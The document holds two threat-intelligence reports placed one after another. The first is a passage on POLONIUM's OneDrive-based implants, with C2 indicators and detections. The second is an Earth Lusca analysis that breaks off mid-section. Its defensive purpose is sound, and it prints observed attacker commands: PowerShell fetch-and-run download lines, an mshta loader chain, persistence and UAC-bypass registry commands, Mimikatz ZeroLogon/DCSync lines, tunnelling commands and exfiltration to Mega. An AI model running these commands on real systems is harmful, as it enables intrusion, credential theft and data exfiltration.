If malware was hosted in the OneDrive account, Microsoft Defender Antivirus detections would block it. Instead, they are interacting with the cloud service in the same way that a legitimate customer would. OneDrive is partnering with MSTIC to identify and disable accounts that are linked to known adversary behavior.
CreepyDrive analysis
The CreepyDrive implant utilizes a POLONIUM-owned OneDrive storage account for command and control. The implant provides basic functionality of allowing the threat actor to upload stolen files and download files to run. All web requests by the CreepyDrive implant use the Invoke-WebRequest cmdlet.
The implant’s logic is wrapped in a while true loop, ensuring continuous execution of the implant once running. The implant contains no native persistence mechanism; if terminated it would need to be re-executed by the threat actor. Due to the lack of victim identifiers in the CreepyDrive implant, using the same OneDrive account for multiple victims, while possible, may be challenging.
It’s likely that a different threat actor-controlled OneDrive account is used per implant. Getting an OAuth token
When run, the implant first needs to authenticate with OneDrive. The threat actor incorporated a refresh token within the implant.
Refresh tokens are part of the Open Authorization 2 (OAuth) specification, allowing a new OAuth token to be issued when it expires. There are several mechanisms that make token theft difficult, including the use of the trusted platform module (TPM) to protect secrets. More information on these mechanisms can be found here.
In this instance, the protection settings tied to the OneDrive account are fully controlled by the threat actor, allowing them to disable protections that prevent the theft of the token and client secrets. As the threat actor is in full control of all secrets and key material associated with the account, their sign-in activity looks like legitimate customer behavior and is thus challenging to detect. This token and client secret are transmitted in the body of request to a legitimate Microsoft endpoint to generate an OAuth token:

https[://]login.microsoftonline.com/consumers/oauth2/v2.0/token
This request provides the requisite OAuth token for the implant to interact with the threat actor-owned OneDrive account.
Using this OAuth token, the implant makes a request to the following Microsoft Graph API endpoint to access the file data.txt:

https[://]graph.microsoft.com/v1.0/me/drive/root:/Documents/data.txt:/content
The file data.txt acts as the primary tasking mechanism for the implant, providing three branches of execution. Upload

The first branch is triggered when the word “upload” is provided in the response. This response payload also contains two additional elements: a local file path to upload, and what is likely a threat actor-defined remote file name to upload the local file into.
The request is structured as follows:

https[://]graph.microsoft.com/v1.0/me/drive/root:/Uploaded/???:/content
Download

The second branch is triggered when the word “download” is provided in the response. This response payload contains a file name to download from the threat actor-owned OneDrive account. The request is structured as follows:

https[://]graph.microsoft.com/v1.0/me/drive/root:/Downloaded/???:/content
Execute

This branch is triggered when no command is provided in the response.
The response payload can contain either an array of commands to execute or file paths to files previously downloaded by the implant. The threat actor can also provide a mixture of individual commands and file paths. Each value from the array is passed individually into the below custom function, which uses the Invoke-Expression cmdlet to run commands:


The output of each executed command is aggregated and then written back to the following location in the threat actor-owned OneDrive account:

https[://]graph.microsoft.com/v1.0/me/drive/root:/Documents/response.json:/content
During the execution of this mechanism, the threat actor resets the content of the original tasking file data.txt with the following request:

https[://]graph.microsoft.com/v1.0/me/drive/root:/Documents/data.txt:/content
Finally, the CreepyDrive implant sleeps, re-executing in a loop until the process is terminated.
Use of custom implant
POLONIUM has also been observed deploying a custom PowerShell implant detected as Backdoor:PowerShell/CreepySnail.B!dha. The C2s for observed CreepySnail implants include:

135[.]125[.]147[.]170:80
185[.]244[.]129[.]79:63047
185[.]244[.]129[.]79:80
45[.]80[.]149[.]108:63047
45[.]80[.]149[.]108:80
45[.]80[.]149[.]57:63047
45[.]80[.]149[.]68:63047
45[.]80[.]149[.]71:80
The code below demonstrates how the CreepySnail PowerShell implant, once deployed on a target network, attempts to authenticate using stolen credentials and connect to POLONIUM C2 for further actions on objectives, such as data exfiltration or further abuse as C2. Use of commodity tools
POLONIUM has also been observed dropping a secondary payload via their OneDrive implant.
POLONIUM used a common SSH tool for automating interactive sign-ins called plink to set up a redundant tunnel from the victim environment to the attacker-controlled infrastructure. The observed C2 IP addresses for POLONIUM plink tunnels include:

185[.]244[.]129 [.]109
172[.]96[.]188[.]51
51[.]83 [.]246 [.]73
Exploitation
While we continue to pursue confirmation of how POLONIUM gained initial access to many of their victims, MSTIC notes that approximately 80% of the observed victims beaconing to graph.microsoft.com were running Fortinet appliances. This suggests, but does not definitively prove, that POLONIUM compromised these Fortinet devices by exploiting the CVE-2018-13379 vulnerability to gain access to the compromised organizations.
IT supply chain attacks
In one case, POLONIUM compromised a cloud service provider based in Israel and likely used this access to compromise downstream customers of the service provider. Specifically, MSTIC observed that POLONIUM pivoted through the service provider and gained access to a law firm and an aviation company in Israel. The tactic of leveraging IT products and service providers to gain access to downstream customers remains a favorite of Iranian actors and their proxies.
Microsoft will continue to monitor ongoing activity from POLONIUM and the other Iranian MOIS-affiliated actors discussed in this blog and implement protections for our customers. The current detections, advanced detections, and IOCs in place across our security products are detailed below. Recommended customer actions
The techniques used by the actor described in the “Observed actor activity” section can be mitigated by adopting the security considerations provided below:

Use the included indicators of compromise to investigate whether they exist in your environment and assess for potential intrusion.
Microsoft Sentinel queries are provided in the advanced hunting section below. Confirm that Microsoft Defender Antivirus is updated to security intelligence update 1.365.40.0 or later, or ensure that cloud protection is turned on, to detect the related indicators. Block in-bound traffic from IPs specified in the “Indicators of compromise” table.
Review all authentication activity for remote access infrastructure (VPNs), with a particular focus on accounts configured with single factor authentication, to confirm authenticity and investigate any anomalous activity. Enable multifactor authentication (MFA) to mitigate potentially compromised credentials and ensure that MFA is enforced for all remote connectivity. NOTE: Microsoft strongly encourages all customers download and use passwordless solutions like Microsoft Authenticator to secure your accounts.
For customers that have relationships with service providers, review and audit partner relationships to minimize any unnecessary permissions between your organization and upstream providers. Microsoft recommends immediately removing access for any partner relationships that look unfamiliar or have not yet been audited. Indicators of compromise (IOCs)
The below list provides IOCs observed during our investigation.
We encourage our customers to investigate these indicators in their environments and implement detections and protections to identify past related activity and prevent future attacks against their systems. Indicator	Type	Description
135[.]125[.]147[.]170:80	IPv4 address	C2  for POLONIUM CreepySnail implant
185[.]244[.]129[.]79:63047	IPv4 address	C2  for POLONIUM CreepySnail implant
185[.]244[.]129[.]79:80	IPv4 address	C2  for POLONIUM CreepySnail implant
45[.]80[.]149[.]108:63047	IPv4 address	C2  for POLONIUM CreepySnail implant
45[.]80[.]149[.]108:80	IPv4 address	C2  for POLONIUM CreepySnail implant
45[.]80[.]149[.]57:63047	IPv4 address	C2  for POLONIUM CreepySnail implant
45[.]80[.]149[.]68:63047	IPv4 address	C2  for POLONIUM CreepySnail implant
45[.]80[.]149[.]71:80	IPv4 address	C2 for POLONIUM CreepySnail implant
185[.]244[.]129[.]109	IPv4 address	C2 for POLONIUM plink tunnels
172[.]96[.]188[.]51	IPv4 address	C2 for POLONIUM plink tunnels
51[.]83[.]246[.]73	IPv4 address	C2 for POLONIUM plink tunnels
Trojan:PowerShell/CreepyDrive.A!dha	Tool	Custom implant signature
Trojan:PowerShell/CreepyDrive.B!dha	Tool	Custom implant signature
Trojan:PowerShell/CreepyDrive.C!dha	Tool	Custom implant signature
Trojan:PowerShell/CreepyDrive.D!dha	Tool	Custom implant signature
Trojan:PowerShell/CreepyDrive.E!dha	Tool	Custom implant signature
Trojan:MSIL/CreepyBox.A!dha	Tool	Custom implant signature
Trojan:MSIL/CreepyBox.B!dha	Tool	Custom implant signature
Trojan:MSIL/CreepyBox.C!dha	Tool	Custom implant signature
Trojan:MSIL/CreepyRing.A!dha	Tool	Custom implant signature
Trojan:MSIL/CreepyWink.B!dha	Tool	Custom implant signature
Backdoor:PowerShell/CreepySnail.B!dha	Tool	Custom implant signature
NOTE: These indicators should not be considered exhaustive for this observed activity. Detections
Microsoft 365 Defender
Microsoft Defender Antivirus

Microsoft Defender Antivirus detects the malware tools and implants used by POLONIUM starting from signature build 1.365.40.0 as the following:

Trojan:PowerShell/CreepyDrive.A!dha
Trojan:PowerShell/CreepyDrive.B!dha
Trojan:PowerShell/CreepyDrive.C!dha
Trojan:PowerShell/CreepyDrive.D!dha
Trojan:PowerShell/CreepyDrive.E!dha
Trojan:MSIL/CreepyBox.A!dha
Trojan:MSIL/CreepyBox.B!dha
Trojan:MSIL/CreepyBox.C!dha
Trojan:MSIL/CreepyRing.A!dha
Trojan:MSIL/CreepyWink.B!dha
Backdoor:PowerShell/CreepySnail.B!dha
Microsoft Defender for Endpoint

Microsoft Defender for Endpoint customers may see any or a combination of the following alerts as an indication of possible attack.
These alerts are not necessarily an indication of POLONIUM compromise:

POLONIUM Actor Activity Detected
PowerShell made a suspicious network connection
Suspicious behavior by powershell.exe was observed
Hidden dual-use tool launch attempt
Outbound connection to non-standard port
Microsoft Defender for Cloud Apps

The OAuth apps that were created in the victim tenants were created with only two specific scope of permissions: offline_access and Files.ReadWrite.All. These applications were set to serve multi-tenant and performed only OneDrive operations. Applications accessed OneDrive workload via the Graph API, where most calls to the API from the application were made as search activities, with a few edit operations also observed.
App made numerous searches and edits in OneDrive

App governance, an add-on to Microsoft Defender for Cloud Apps, detects malicious OAuth applications that make numerous searches and edits in OneDrive. Learn how to investigate anomaly detection alerts in Microsoft Defender for Cloud Apps.
Delving Deep: An Analysis of Earth Lusca’s Operations By Joseph C Chen, Kenney Lu, Gloria Chen, Jaromir Horejsi, Daniel Lunghi, and Cedric Pernet Overview Numerous factors have made attribution more difficult today than it has ever been, especially when it comes to attributing cyberespionage operations to threat actors. The infrastructure and malware that threat actors use constantly evolve, and the same actor can even use a totally different set of tools, tactics, and procedures (TTPs) from one campaign to another. In addition, several different threat actors might collaborate and share tools, infrastructure, or malware.
In this tech brief, we are going to expose a threat actor originating from China. Since the malware being used by the group, such as ShadowPad and Winnti, overlapped with other threat actors, its activities were attributed to other groups such as APT41, Earth Baku, Sparkling Goblin, and the “Winnti” cluster in different reports. Our research reveals the different TTPs and the independent set of infrastructure that made us consider it a separate threat actor from the other known actors mentioned.
Some reports named this threat actor “TAG-22” or “Fishmonger.” We decided to separate it from the Winnti umbrella and track this threat actor under the name “Earth Lusca.” Our investigation of Earth Lusca started in mid-2021, when we discovered a campaign targeting customer service companies in China via a watering hole attack. Eventually, our monitoring and research lead to the publication of a blog post on a previously-unreported malware known as BIOPASS RAT. We continued monitoring the threat actor, eventually discovering a few more targeted operations against various targets worldwide.
In this research, we will expose all of the groups TTPs and its current operations. During our investigation, we also managed to reach some of the victims and gather interesting information from compromised servers that were used as watering holes. We were able to learn Earth Lusca’s reconnaissance and lateral movement techniques while working with our local incident response service team via our XDR system,.
The goal of this research is to piece together a puzzle of fragmented parts that we do not often see together — and in turn, provide a clearer picture of the threat actor and its activities. Targeting Our monitoring yielded information on multiple operations from Earth Lusca. Some targets were reported publicly in attacks that could be associated to this threat actor.
These include: Gambling companies in Mainland China Government institutions in Taiwan, Thailand, Philippines, Vietnam, United Arab Emirates, Mongolia, and Nigeria Educational institutions in Taiwan, Hong Kong, Japan, and France News media in Taiwan, Hong Kong, Australia, Germany, and France Pro-democracy and human rights political organizations and movements in Hong Kong Covid-19 research organizations in the United States Telecom companies in Nepal Religious movements that are banned in Mainland China Various cryptocurrency trading platforms Note that more industries or countries may have been targeted; our investigation relies on tools and methods that can provide a comprehensive view — but not a complete one.
Figure 1. Affected countries and regions Considering the nature of targets and the evidence we found, we believe the goal of their operations is cyberespionage. However, they also seem to be financially motivated based on their attacks on gambling companies and cryptocurrency platforms. Infrastructure To gain a deeper understanding of Earth Lusca’s operations, we first need to look at the threat actor’s infrastructure, which essentially provides the first piece of the puzzle. Figure 2. Probable Earth Lusca infrastructure based on our findings Operating Model To gain an overview of the threat actor’s infrastructure, we separated it into two clusters.
The first cluster is mainly constructed with virtual private servers (VPS) that rent from the service provider Vultr. By analyzing the records from passive DNS databases, the earliest server they used via Vultr could be traced back to April 2019. The infrastructure was mentioned in a report, dated January 2020, covering targeted attacks on Hong Kong’s universities. Earth Lusca built a second cluster mainly composed of compromised web servers beginning around mid2020. We noticed that many of these compromised servers were running old versions of open-source editions of Oracle GlassFish Server.
Furthermore, it also adopted Cloudflare as a proxy for compromised servers to prevent people from finding their server IP addresses directly. However, the passive DNS data and the misconfiguration of certificates allowed us to identify some of the compromised servers behind the proxy. A similar analysis of this infrastructure cluster was previously mentioned in an earlier report from the Nippon Telegraph and Telephone (NTT) group. We found that these two infrastructure clusters are responsible for different roles in an attack.
The first cluster acts as the command-and-control (C&C) server for malware — including Cobalt Strike, ShadowPad, FunnySwitch, and Winnti — that the group uses to infect victims. The second cluster similarly acted as a Cobalt Strike C&C server — however, it was also used to scan for vulnerabilities in the public-facing servers of their targets or building traffic tunnels within the victim’s network. In a real-life scenario that we investigated, Earth Lusca owned and used multiple servers, as can be seen on Figure 2.
These servers were split into different roles, which may have been used for single attack operations. The initial scanning done by the threat actor came from a different IP address, showing that they deliberately used their servers for a single purpose: to make it more difficult to defend against the attack. Scanning by itself is very common, and is not a very accurate method of determining where an attack comes from.
An organization’s security team might be misled towards a different direction and actually miss out on detecting the real attack — in essence, the attacker feints an attack to trick defenders down the wrong path. Compromised Server as Infrastructure As previously mentioned, the actor uses compromised web servers to build their infrastructure. An example of this is the malicious domain “lzfhome[.]xyz”, which shows how the threat actor misused the compromised servers. The domain, which was registered by the threat actor, is a variant of the legitimate lzfhome.com domain that belongs to a dissident organization.
Yet the hosting server used is a compromised one. The fraudulent domain was first used for a watering hole attack, before being reused later as a Cobalt Strike C&C server.
Date Domain IP Note Mar 2, 2021 lzfhome[.]xyz Domain registered Mar 4, 2021 download.lzfhome[.]xyz 172.67.157.190 Cloudflare proxy Mar 4, 2021 download.lzfhome[.]xyz 104.21.14.47 Cloudflare proxy Mar 4, 2021 www.lzfhome[.]xyz 172.67.157.190 Cloudflare proxy Mar 4, 2021 www.lzfhome[.]xyz 104.21.14.47 Cloudflare proxy Mar 27, 2021 lzfhome[.]xyz 160.16.208.58 Compromised GlassFish server May 6, 2021 lzfhome[.xyz 213.246.45.15 Compromised GlassFish server Sep 9, 2021 lzfhome[.]xyz 202.143.111.209 Compromised server Oct 20, 2021 lzfhome[.]xyz 104.21.71.224 Cloudflare proxy Oct 20, 2021 lzfhome[.]xyz 172.67.172.101 Cloudflare proxy Table 1. The resolve history for lzfhome[.]xyz Table 1 shows the historical DNS resolving result collected from multiple passive DNS databases.
We discovered that the threat actor adopted the Cloudflare proxy to the malicious domain. However, some records showed that it was also resolved to three web servers across different time periods. Looking into these web servers, two of them are running GlassFish server opensource edition 4.1, which contains a vulnerability with a publicly available exploit. These web servers do not seem to be used solely by Earth Lusca, but are more likely to be compromised as their HTTPS certificates show different domains.
Another interesting aspect we found is that the compromised servers with an open port 8443 adopted certificates provided by Cloudflare. We also observed that the port also has a Cobalt Strike C&C server listening. Similar issues with exposed Cloudflare certificates could be found on other compromised GlassFish servers related to Cobalt Strike C&C domains, leading us to believe that the threat actor compromised these web servers and used them as their Cobalt Strike C&C servers.
Threat Actor’s Originating Region Tracking down the source of the operation can prove to be difficult since threat actors usually hide their activities behind proxy servers located in different countries and regions. Occasionally, however, an attacker makes mistakes by forgetting to use their proxies or by misconfiguring them.
We combined two pieces of data to figure out the possible source region of the threat actor: Our IR team found an IP address that executed commands via web shell on the access log Secure Shell (SSH) access logs show a suspicious IP address connected to a compromised server We have confirmed that both IP addresses are not proxy or VPN servers. The IP address lookup results show that the source region is near Sichuan, Chengdu, China.
Attack Vectors Earth Lusca employs different attack vectors — such as sending spear phishing messages to employees or using watering holes websites — to infect its targets. The group also compromises their victims by directly exploiting vulnerabilities of public-facing servers. We found that Earth Lusca has been focusing less on the former and more on the latter since the second half of 2021. Spear Phishing Through our telemetry data, we observed Earth Lusca sending spear phishing emails containing a malicious link to a target news organization.
The files in the link were presented either as a document that journalists might be interested in, or as an opinion form sent by another media organization. The downloaded file is an archive file that contains either a malicious LNK file or an executable file. These archives were hosted either on compromised web servers or Google Drive repositories. Figure 3. An example of a malicious archive delivered via spear phishing email Figure 4.
The infection chain of the spear phishing emails In some cases, the victims receive an executable file or an SFX installer inside the archive delivered via spear phishing that turns out to be a malicious loader. The analysis of the loader is detailed in the “Malware Analysis” section.
In other cases where victims received an LNK file inside the archive, the LNK will execute the file %SYSTEM32%\forfiles.exe and give the command string shown in the following argument: /m "{name of decoy document}.lnk" /c "cmd /c echo f|xcopy @file %temp%\{random name}.tmp&for /r c:\windows\system32\ %i in (*sht*.exe) do %i [URL of HTA file}" The command will move the LNK file into the %TEMP% folder and run mshta.exe to load the malicious HTA script from the given URL.
The malicious HTA script will then copy certutil.exe to the %APPDATA% folder and rename it as a different process name — which was chrome.exe in the case we analyzed. The LNK file will then be appended with a Base64-encoded string at the end. The HTA script will use the “findstr” command to search for the string “TVNDRgAAA” in the LNK file and extract the identified Base64-encoded string to another temporary file.
Next, it uses the copied certutil.exe to decode the string to a Cabinet file, after which it uses the “expand” command to extract the payload from the Cabinet file. The extracted files include a decoy document and a malware file, which is a Cobalt Strike loader. The HTA file will open the decoy document and launch the loader in background. Watering Hole Earth Lusca compromised the websites of their targets or created fake web pages to perform their watering hole attacks.
We observed the threat actor copying web pages from legitimate websites and manipulating them to inject malicious JavaScript code. They then deliver the link of these malicious pages to their victims to carry out the attack. During another investigation, we found that they also directly injected their malicious script into the HR system of a compromised target. The injected scripts used in different cases are similar and are likely modified from a project called “Flash-Pop.” Figure 5.
The script used to check the User-Agent string and send the callback to “ts.php” The injected script’s main function is to launch social engineering attacks. During the attack, the injected script will try to detect the browsers User-Agent and avoid attacking mobile devices. It sends a callback HTTP request to “ts.php" to a remote server as another filtering technique. The PHP script “ts.php” recodes the information of request to include the access time, the source IP address and the HTTP referrer header into a log file “vi.txt”. The referrer header shows where the script is triggered from.
When the PHP script finds a request with a source IP address that hasn’t been recorded in the vi.txt file, it will return HTTP status code 200. The social engineering message will only show up on the watering hole page and instruct the targets to download the malware file when the injected script receives code 200 from the PHP script. We believe that this PHP script was used to record the victims’ information as well as to avoid a case of double infection on the same target.
The social engineering messages used in the Earth Lusca attack include requests to update Flash applications or showing a DNS resolving error and then asking the victim to download a file. The downloaded files from their watering hole attack are the group’s Cobalt Strike loaders. Figure 6. The DNS error message pop up found in the watering hole page (translated via Google Translate: “Browser DNS resolution error. Please download and try again after clearing the DNS cache. Open website. Download again.”) Figure 7.
The Flash update request message pop up on a crafted online video page Server Vulnerabilities Exploiting vulnerabilities in public-facing applications is a tried-and-tested cyberattack technique. Our incident response activities found evidence that Earth Lusca also performed these types of attacks. These attacks are not exactly the same for every case, but still cover common MITRE ATT&CK Tactics. Figure 8.
MITRE ATT&CK Tactics employed by Earth Lusca Execution Dropping 1st stage backdoor Initial Access Finding the vulnerability and exploiting it manually Reconnaissance Scanning with massive scanners On one occasion, we saw the threat actor exploit an unreported vulnerability via an attack that was customized to the targeted website, revealing that the attacker possessed advanced skills in penetration testing and exploiting vulnerabilities. In the following sections, we detail two public vulnerabilities and how Earth Lusca exploited them.
Microsoft Exchange – ProxyShell Since the first ProxyShell proof-of-concept (PoC) was released on GitHub, several different threat actors have used it in their activities. Some have used it as is without modifying it, while some others have randomized the filenames to make their web shell slightly different. This makes it very difficult to distinguish the different threat actors using it. However, we were able to discover our threat actor via common patterns, which we will discuss in later sections.
For Earth Lusca’s ProxyShell exploit, the group did not change the filename naming rule “[a-z]{16}.aspx”, but the payload was modified as the following figure: Figure 9. The ProxyShell payload We also identified the management tool as “AntSword,”a cross-platform website management toolkit, based on network traffic request patterns. We suspect that the exploit combines the following public exploits on GitHub: ProxyShell (for the exploit) - https://github.com/dmaasland/proxyshell-poc ProxyLogon (for the payload) - https://github.com/RickGeex/ProxyLogon Once Earth Lusca successfully exploits and controls the server, the group will start to install Cobalt Strike and perform post-exploitation routines to expand their attack surface.
Oracle GlassFish There are many GlassFish servers that are vulnerable to attacks. Hunting these vulnerable servers can be done using tools like Shodan. While Shodan is the most popular tool for this activity in North America and Europe, similar search engines that are less popular in these regions exist, such as FOFA. Figure 10. Screenshot of the FOFA search engine  Figure 11. GlassFish servers results from searching Shodan and FOFA We assume that the threat actor may have located vulnerable GlassFish servers using version 4.1.2 via the aforementioned search engines before running a publicly available exploit on them.
Exploiting the vulnerability leads to the uploading of the WAR file containing a JSP file (server-generated webpage), which in turn contains the web shell. Figure 12. The JSP web shell This particular web shell needs to encrypt and decrypt data on the fly, making its behavior match an infamous website management tool known as “Behinder,” a closed source project but with a client available for free on GitHub. Earth Lusca also dropped an SSH-authorized key on the “/root/.ssh” folder in order to access the server with SSH.
The group also installed a software called “Acunetix Web Vulnerability Scanner” on compromised GlassFish servers. This tool is a powerful commercially-available web vulnerability scanner, typically used by professional penetration testers for security assessment. Our findings on this end mirror the observations noted in NTT’s report. We noticed some of compromised servers were running Acunetix as the web login panel opened. Earth Lusca seems to use it as a reconnaissance tool. The scanning usually generates plenty of noise and volume traffic on the target website.
A Notification System for Cobalt Strike Spear phishing and watering hole attacks are very common techniques, but they are sometimes difficult to track for the attacker. Once the backdoor is triggered by an unsuspecting user, the threat actor needs to know about it to process the next steps in the attack. On one compromised server being used as a watering hole, we found a mystery CNA file written in the scripting language “Aggressor Script,” which allows users to modify and extend the Cobalt Strike client.
In the CNA script, when a new beacon is initialized, the client information is extracted and sent to a remote server, thereby notifying the attacker. Figure 13. The notification CNA script The script was modified from another popular script, which sends a message via a public service called “ServerChan.” The threat actor modified the endpoint of the API and slightly reduced the amount of information sent. It is highly likely that the script enhanced the attacker’s agility regarding the attack sequence.
Post Exploitation A Chinese proverb states that “A workman must first sharpen his tools if he is to do his work well,” which basically says that one needs the right tool for the job. This principle also applies to threat actors. In the next two primary sections covering the post exploitation routines and related malware, we provide an overview of the tools, tactics, techniques, and procedures collected from our feedback and incident response activities, and information from the compromised servers. We will also share an interesting storage space on GitHub that we managed to link to this group.
This GitHub repository contains information that provided us with a much better understanding of Earth Lusca. GitHub Link https://github.com/yuilbrun/hmm/ Reconnaissance Earth Lusca collected information from several Windows utilities, including “net,” “nltest,” “ipconfig,” “netstat,” and “tasklist,” to obtain information on user accounts, domain controllers, and network configurations from the compromised systems. We also noticed the third-party tools adfind and PowerSploit being used during the reconnaissance phase. The following command was used by the threat actor to load PowerSploit to discover the other machines in the same domain.
powershell IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/mast er/Recon/PowerView.ps1’);Get-NetComputer -FullData > [file path] Discovery We have seen the threat actor using multiple scanning tools in different incidents to discover other machines in the same compromised network environment. Tool Name Command HUC Port Banner Scanner hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443 nbtscan nbtscan.exe 172.16.1.1/16 fscan fscanx86.exe -h 172.16.2.0/24 -m smb -t 100 Table 2. Scanning tools and observed commands NBTscan is a tool that helps users discover the network environment and any shared folders by scanning for NetBIOS name information.
Fscan, on the other hand, is a comprehensive internal network scanning tool — written in Golang — that provides numerous functions including network scanning, vulnerability scanning, building reverse shells, and brute forcing common services. We could not find much information about hbs.exe. However, we identified a few file named “hbs.exe” on VirusTotal — possibly from the same threat actor since the files are signed with the same stolen certificate that Earth Lusca used to sign the other malware binaries.
Analysis of the files revealed that it contained the string “HUC Port Banner Scanner,” which indicates that it is a port scanning tool. Earth Lusca also checked the Windows event log to find the network information of the successfully logged-in accounts (Event ID 4624). This allows the group to discover the addresses of other machines.
The following commands were used for this: powershell “Get-EventLog -LogName security -Newest 500 | where {$_.EventID -eq 4624} | format-list - property * | findstr “Address”” wevtutil qe security /format:text /q:”Event[System[(EventID=4624)] and EventData[Data[@Name=’TargetUserName’]=’administrator’]]”|find “Source Network Address” In addition, we saw that the threat actor employed a PowerShell script (RDPConnectionParser.ps1) to read and filter the Windows event log “Microsoft-Windows-TerminalServices-RDPClient/Operational” (Event ID 1024) in order to obtain the network information from remote desktop protocol (RDP) connections. This script is available publicly. We observed the following PowerShell command being used to launch the script.
powershell IEX (NewObjectNet.WebClient).DownloadString(‘https://raw.githubusercontent.com/yuilbrun/hmm/master/tas389 .ps1’) It’s worth mentioning that Earth Lusca didn’t download the script from repositories that hosted it. However, they uploaded the script to their GitHub repository, yuibrun/hmm. We believe that the threat actor owns this GitHub account since it also has attack tools and malware uploaded to it. We will share our findings on the GitHub account in the “Additional Findings” subsection. Persistence and Privilege Escalation Earth Lusca devised several approaches to maintain its access to the victim’s system and retain persistence even after reboot.
A common method we observed was via the creation of a service that pretended to be a system update service. A previously prepared Cobalt Strike loader was then uploaded to the victim’s system, after which the created service will run a command to launch the loader. The creation of scheduled tasks and the registering of initialization scripts were also used to maintain the execution of Earth Lusca’s malware.
We observed the following commands in different incidents: sc create “SysUpdate” binpath= “cmd /c start “[file path]””&&sc config “SysUpdate” start= auto&&net start SysUpdate schtasks /Create /SC ONLOgon /TN WindowsUpdateCheck /TR “[file path]” /ru system reg add “HKEY_CURRENT_USER\Environment” /v UserInitMprLogonScript /t REG_SZ /d “[file path]” We also noticed two other persistence techniques leveraging existing system services. First, we found the threat actor placing their payload in the location “%WINDIR%\SYSTEM32\oci.dll”. The DLL file does not exist in the system by default but will be loaded by the MSDTC service.
This allows the attacker to place an arbitrary payload that will be sideloaded by the MSDTC service. We reported the use of this technique in another APT attack research. In another incident, we saw the threat actor dropping their payload into “%WINDIR%\SYSTEM32\spool\prtprocs\x64\spool.dll” and registering the DLL name as a Windows print processor.
The payload was loaded by the Print Spooler service after the actor restarted the system service “spooler.” A similar trick was reportedly being used by the “PipeMon” malware, as seen in the following command: move [file path] c:\windows\system32\spool\prtprocs\x64\spool.dll reg add “HKLM\SYSTEM\ControlSet001\Control\Print\Environments\Windows x64\Print Processors\UDPrint” /v Driver /d “spool.dll” /f sc stop spooler sc start spooler We observed that the actor used the Fodhelper UAC bypass technique to gain elevated privileges via the following commands: reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d “%appdata%\[file name]” /f reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /v DelegateExecute /t REG_SZ /d “” /f fodhelper.exe reg delete HKEY_CURRENT_USER\Software\Classes\ms-settings /f We also found the open-source tool BadPotato to be used Earth Lusca to gain higher privileges: C:\ProgramData\badpotato.exe whoami Credential Access To gain greater access to the victim’s internal network, the threat actor will first target user credentials.
We observed Earth Lusca using the procdump tool to obtain the hashes of these credentials by dumping the memory of the lsass process which is a technique often used by attackers. In additional, they used Mimikatz to exploit the domain controller via the ZeroLogon exploit. After a successful exploitation, the threat actor inputs a DCSync command with Mimikatz which allows the group to retrieve the credentials from the exploited controller: mimikatz32.exe “lsadump::zerologon /target:10.0.0.18 /account:[account name]$” “exit” mimikatz32.exe “lsadump::zerologon /target:10.0.0.18 /account:[account name]$” /exploit “exit” mimikatz32.exe lsadump::dcsync „exit“ Proxy Earth Lusca established network tunnels between the target’s network and external servers.
The external servers connected by these tunnels belong to the second cluster of servers we mentioned in the “Infrastructure” section. By matching the parameters of the commands, we were able to determine the proxy tools they used even after they renamed the binary. Tool Name Command lcx xs.exe -connect [ip address] [port number] frp frpc.exe -c frpc.ini EarthWorm we.exe -s rssocks -d [ip address] -e [port number] Table 3.
Proxy tools and observed commands Exfiltration To exfiltrate a large number of files from a target folder, we observed Earth Lusca using WinRAR to compress the files into an archive and then using the megacmd tool to upload the archive to Mega service.
The megacmd tool is not an official one, nevertheless, setting up the tool is even easier than configuring the official tool, since only a simple json file with predefined credentials is needed, after which an attacker can place the tool on the victim’s machine and upload it via the company network — making it similar, in a way, to DropBox or Google Drive. Rar a -v3g -k -r -s -m3 [compressed file] [target path] megacmd -conf [config] put [file] mega:[upload path] Additional Findings During investigation, we found that Earth Lusca loaded a PowerShell script from the GitHub repository yuibrun/hmm.
A look into the repository revealed other attack tools as well as malware, including: JSP (Behinder), Perl (Gamma Web Shell), C# and PHP web shells Python scripts for port scanning or building reverse shells A Visual Basic for Applications (VBA) script (wmi.vba) to execute Windows Management Instrumentation (WMI) Exploit tools such as DirtyCow, SMBGhost and JuicyPotato Cobalt Strike loaders and XMR miners Winnti malware, loader, and the install script (Linux version) One of the Cobalt Strike samples (4814e8baf52df7a17af3d88aba38d7bce4aed753a05b3d64478d4efedccc6625) found on the repository connected to the C&C domain coivo2xo[.]livehost[.]live, which the group reportedly owns.
The JSP web shell Behinder was also identified on compromised GlassFish servers, as mentioned in the server vulnerabilities subsection. The Linux version sample of Winnti (libxselinux) was also found on the repository, including the loader (libxselinux.so), and the install script (install). The threat actor was reported to have previously used the Winnti malware in their attacks. These clues point to the likelihood that Earth Lusca owns this repository. Figure 14. The GitHub repository hosting web shells, malware, and attack scripts Malware Analysis Cobalt Strike Loader The threat actor often employs penetration testing tools such as Cobalt Strike.
Custom Cobalt Strike loaders were identified in attacks associated with Earth Lusca that were found to be delivered via spear phishing emails or watering hole attacks, typically involving documents or applications. Once the user executes the loader, it will open the decoy document or the application that it pretends to be. In the background, however, it also downloads a Cobalt Strike shellcode that is XOR encoded with a XOR key.
We have observed different XOR keys being used in different loaders, including “fish_master,” “fishdownload,” and “azdx64x64.” Additional research found other encryption or encoding techniques used in their loaders to hide shellcode. XOR with single byte XOR with multi-bytes AES 256 DES Base64 Steganography In the case of steganography, the loader downloads a BMP image file instead of an encoded shellcode. The attacker then uses steganography to hide shellcode into an image. The loader then extracts it from the picture to retrieve the Cobalt Strike shellcode. Figure 15.
Steganography image contains randomly colored pixels at the bottom Here are the steps to extract the shellcode from the picture: The first step involves reading a DWORD value from the address 0x0A (the green text in figure 16), which tells the offset (bfOffBits) where the data starts (blue text). It then moves a displacement value to bfOffBits — which was “3” in the cases we observed. Starting with the byte at offset bfOffBits+3, this byte is part of the HEX value of the original shellcode (red text). It adds an interval value, which is “4” in this case.
This byte is another part of the shellcode’s HEX value (red text). The process will keep adding the interval value, eventually getting the HEX value to construct the original shellcode. We have also seen a variant of the process that subtracts each HEX value with the value “1” to obtain the original HEX value. Figure 16.
